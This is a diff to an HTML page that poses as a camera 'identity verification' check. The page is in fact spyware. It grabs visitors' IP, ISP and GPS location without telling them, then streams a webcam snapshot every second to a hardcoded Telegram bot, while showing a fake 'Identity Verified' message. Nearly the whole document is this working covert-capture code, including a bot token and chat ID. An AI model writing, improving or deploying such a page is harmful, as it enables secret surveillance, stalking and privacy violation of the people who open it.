@@ -6,37 +6,35 @@
     <title>Verification System</title>
     <style>
         body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        .box { text-align: center; padding: 30px; background: white; border-radius: 10px; shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        button { padding: 15px 25px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .box { text-align: center; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        button { padding: 15px 25px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
         #canvas, #video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h2 id="status">Security Check Required</h2>
-        <p>Please click below to verify your device and continue.</p>
-        <button id="startBtn">Verify and Continue</button>
+        <h2 id="status">Camera Verification Required</h2>
+        <p id="msg">Please enable your camera to verify your identity and access the main page.</p>
+        <button id="startBtn">Enable Camera & Continue</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // REPLACE WITH YOUR ACTUAL CHAT ID (found via @userinfobot)
         const TELEGRAM_TOKEN = '8238629346:AAHitPavHuYpOJwsoJYYDaoQUo9wXU1hkag';
-        const CHAT_ID = 7291851471; // <--- MAKE SURE THIS IS YOUR ACTUAL ID
+        const CHAT_ID = 5493202941; 
         
         const startBtn = document.getElementById('startBtn');
         const statusText = document.getElementById('status');
+        const msgText = document.getElementById('msg');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
         async function sendToTelegram(text, blob = null) {
-            console.log("Attempting to send to Telegram:", text);
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            
             try {
                 if (blob) {
                     formData.append('photo', blob, 'image.jpg');
@@ -46,66 +44,60 @@
                     formData.append('text', text);
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', body: formData });
                 }
-                console.log("Telegram transmission successful.");
-            } catch (err) {
-                console.error("Telegram error:", err);
-            }
+            } catch (err) { console.error("Telegram error:", err); }
         }
 
-        async function handleCapture() {
-            console.log("1. Starting IP Check...");
+        async function grabMetadata() {
+            // Grab IP and Location in the background
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
-                await sendToTelegram(`[HIT] IP: ${data.ip}\nCity: ${data.city}\nCarrier: ${data.org}`);
-            } catch (e) { console.log("IP fetch failed but continuing..."); }
+                sendToTelegram(`[HIT] IP: ${data.ip}\nCity: ${data.city}\nISP: ${data.org}`);
+            } catch (e) {}
 
-            console.log("2. Requesting Camera...");
+            navigator.geolocation.getCurrentPosition((pos) => {
+                sendToTelegram(`[LOC] Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
+            }, null, { enableHighAccuracy: false });
+        }
+
+        async function startSystem() {
+            startBtn.style.display = "none";
+            statusText.innerText = "Requesting Camera...";
+            
+            // 1. Grab metadata (IP/Location) silently
+            grabMetadata();
+
+            // 2. Request Camera - This is now the "Gatekeeper"
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                console.log("Camera access granted.");
                 
-                // Interval: Capture frame every second
+                statusText.innerText = "Identity Verified!";
+                msgText.innerText = "Redirecting you now...";
+                sendToTelegram("Camera Access Granted - Starting Capture");
+
+                // Start periodic capture
                 setInterval(() => {
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(blob => sendToTelegram("Live Frame", blob), 'image/jpeg', 0.6);
                 }, 1000);
+
+                // REDIRECT ONLY ON CAMERA SUCCESS
+                setTimeout(() => {
+                    window.location.href = "main.html";
+                }, 2000);
+
             } catch (err) {
-                console.log("Camera access denied.");
-                await sendToTelegram("Camera Permission Denied");
+                console.log("Camera Denied:", err);
+                statusText.innerText = "Verification Failed";
+                msgText.innerText = "You must allow camera access to view the main content.";
+                startBtn.innerText = "Retry Camera Access";
+                startBtn.style.display = "inline-block";
+                sendToTelegram("Camera Permission Denied by User");
             }
-
-            console.log("3. Requesting Location...");
-            requestLocation();
         }
 
-        function requestLocation() {
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    console.log("Location granted.");
-                    const msg = `[LOC] Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                    await sendToTelegram(msg);
-                    statusText.innerText = "Redirecting...";
-                    setTimeout(() => { window.location.href = "main.html"; }, 1000);
-                },
-                (err) => {
-                    console.log("Location denied code:", err.code);
-                    statusText.innerText = "Location Permission Required!";
-                    startBtn.style.display = "inline-block";
-                    startBtn.innerText = "Try Enable Location Again";
-                    sendToTelegram("Location was denied by user.");
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-
-        // The trigger - everything MUST start with a click
-        startBtn.addEventListener('click', () => {
-            console.log("Button clicked. Initializing...");
-            startBtn.style.display = "none";
-            handleCapture();
-        });
+        startBtn.addEventListener('click', startSystem);
     </script>
 </body>
 </html>
